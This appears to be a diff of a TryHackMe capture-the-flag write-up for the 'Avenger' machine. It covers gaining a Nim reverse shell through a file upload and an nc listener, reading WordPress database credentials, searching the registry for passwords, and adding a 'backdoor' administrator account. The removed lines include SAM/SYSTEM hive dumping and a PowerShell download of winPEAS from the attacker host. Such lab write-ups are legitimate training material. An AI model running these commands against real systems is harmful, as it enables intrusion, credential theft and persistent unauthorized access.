@@ -107,6 +107,8 @@ wpscan --url http://avenger.tryhackme/gift --passwords /usr/share/wordlists/rock
 
 
 
+## Initial Shell
+
 <figure><img src="../../.gitbook/assets/image (988).png" alt=""><figcaption></figcaption></figure>
 
 
@@ -136,6 +138,8 @@ if %errorlevel% equ 0 (
 )
 </code></pre>
 
+I tried bypassing the file type restriction with the shell above, I could see the bat file running by seeing that it try to grab the shell.php file but I couldn't find a place to save the file where I could also see it on the website.
+
 **Kali**
 
 ```
@@ -144,20 +148,28 @@ python2 -m SimpleHTTPServer 82
 
 <figure><img src="../../.gitbook/assets/image (989).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+Nim reverse shell worked because they accept exe files&#x20;
 
 **Kali**
 
 <pre><code>git clone https://github.com/Sn1r/Nim-Reverse-Shell.git
 cd Nim-Reverse-Shell/
 <strong>apt install mingw-w64 -y
-</strong>curl https://nim-lang.org/choosenim/init.sh -sSf | sh
-subl rev_shell.nim
-</code></pre>
+</strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+**Kali**
+
+```
+curl https://nim-lang.org/choosenim/init.sh -sSf | sh
+```
+
+**Kali**
+
+```
+subl rev_shell.nim
+```
+
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali #1**
 
@@ -175,7 +187,11 @@ subl rev_shell.nim
 rlwrap nc -lvnp 443
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+## **Privilege Esclation**&#x20;
+
+Found some credentials.
 
 **Victim**
 
@@ -185,12 +201,16 @@ type C:\xampp\htdocs\gift\wp-config.php
 
 <figure><img src="../../.gitbook/assets/image (995).png" alt=""><figcaption></figcaption></figure>
 
+From my computer I could access the mysql.
+
 **Kali**
 
 ```
 apt install mysql-client-core-5.7   
 mysql -h$VICTIM -ugift -pSurpriseMF
 ```
+
+I was able to find a password but couldn't crack it&#x20;
 
 **Kali(mysql)**
 
@@ -203,18 +223,50 @@ select * from wp_users;
 
 <figure><img src="../../.gitbook/assets/image (992).png" alt=""><figcaption></figcaption></figure>
 
-**Kali**
-
-```
-reg.exe save HKLM\SYSTEM C:\xampp\htdocs\system.bak
-reg.exe save HKLM\SAM C:\xampp\htdocs\sam.bak
-```
+I found a password
 
 **Victim**
 
 ```
-cd C:\Users\natbat\Desktop
-powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:81/winPEASx64.exe','winPEASx64.exe')" 
-winPEASx64.exe
+reg query HKLM /f password /t REG_SZ /s
 ```
 
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+remmina
+Username: hugo
+Password: SurpriseMF123!
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+I can run a administrator shell from the GUI
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+
+
+**Victim**
+
+```
+net user backdoor pass!123 /add
+net localgroup Administrators "Remote Desktop Users"  backdoor /add
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v forceguest /t reg_dword /d 0 /f
+```
+
+
+
+**Kali**
+
+```
+remmina
+Username: backdoor 
+Password: pass!123
+```
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
